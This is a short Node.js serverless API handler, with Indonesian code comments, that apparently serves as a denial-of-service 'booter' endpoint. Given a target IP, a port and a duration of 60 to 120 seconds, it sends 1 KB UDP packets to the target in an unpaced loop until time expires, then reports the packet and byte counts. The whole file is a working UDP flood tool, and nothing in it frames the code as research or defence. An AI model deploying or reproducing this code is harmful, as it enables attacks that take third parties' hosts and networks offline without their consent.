export const config = {
  runtime: 'nodejs18.x',
};

import dgram from 'node:dgram';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { ip, port, duration } = req.body;

  if (!ip || !port || ![60, 90, 120].includes(+duration)) {
    return res.status(400).json({ error: 'Invalid parameters' });
  }

  const client = dgram.createSocket('udp4');
  // payload 1 KB
  const payload = Buffer.allocUnsafe(1024).fill('X');
  const stopAt = Date.now() + Number(duration) * 1000;

  let packets = 0;
  let bytes = 0;

  // loop tanpa jeda
  function blast() {
    if (Date.now() > stopAt) {
      client.close();
      return res.json({
        packets,
        bytes,
        duration: Number(duration),
        target: `${ip}:${port}`,
      });
    }

    client.send(payload, Number(port), ip, (err) => {
      if (!err) {
        packets++;
        bytes += payload.length;
      }
      // langsung kirim lagi
      setImmediate(blast);
    });
  }

  blast();
}
